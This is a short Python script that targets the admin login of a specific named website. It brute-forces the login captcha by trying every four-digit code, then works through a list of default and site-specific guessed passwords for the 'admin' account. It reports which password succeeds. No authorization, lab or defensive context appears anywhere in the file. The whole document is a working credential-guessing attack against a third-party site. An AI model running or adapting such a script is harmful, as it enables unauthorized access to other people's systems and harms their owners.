import subprocess, json, sys

# Get UUID
r = subprocess.run(['curl','-sk','https://api.myxypt.com/captcha?width=140&height=48'],
    capture_output=True, text=True, timeout=10)
uuid = json.loads(r.stdout)['data']['uuid']
print('UUID:', uuid)

# Get session
subprocess.run(['curl','-sk','-c','/tmp/cn_final.txt',
    'http://chinanaisi.com/admin/login','-o','/dev/null'], timeout=5)

# Passwords
pws = ['admin123','admin','admin888','123456','password','chinanaisi',
       'chinanaisi123','naisi','naisi123','hongguanjixie']

# Find correct code
correct_code = None
for i in range(10000):
    code = '%04d' % i
    try:
        r = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','4',
            '-b','/tmp/cn_final.txt',
            'http://chinanaisi.com/admin/login.php','-X','POST',
            '-d','action=loginpost&uuid='+uuid+'&loginId=&username=admin&password=test&checkcode='+code,
            '-H','X-Requested-With: XMLHttpRequest','-A','Mozilla/5.0',
            '-D','-','-o','/dev/null'],
            capture_output=True, text=True, timeout=6)
    except: continue
    if '验证码' not in r.stdout:
        correct_code = code
        print('Found code:', code)
        break
    if i % 500 == 0: print(code)

if not correct_code:
    print('Code not found in 10000')
    sys.exit(1)

# Try passwords with correct code
for pw in pws:
    r = subprocess.run(['curl','-sk','-b','/tmp/cn_final.txt',
        'http://chinanaisi.com/admin/login.php','-X','POST',
        '-d','action=loginpost&uuid='+uuid+'&loginId=&username=admin&password='+pw+'&checkcode='+correct_code,
        '-H','X-Requested-With: XMLHttpRequest','-A','Mozilla/5.0',
        '-D','-','-o','/dev/null'],
        capture_output=True, text=True, timeout=8)
    loc = [l for l in r.stdout.split(chr(10)) if 'Location:' in l]
    if not loc or '/admin/login.php' not in str(loc):
        print('>>> LOGIN SUCCESS: admin/' + pw + ' <<<')
        break
    else:
        print('  ' + pw + ': failed')
else:
    print('All passwords failed')
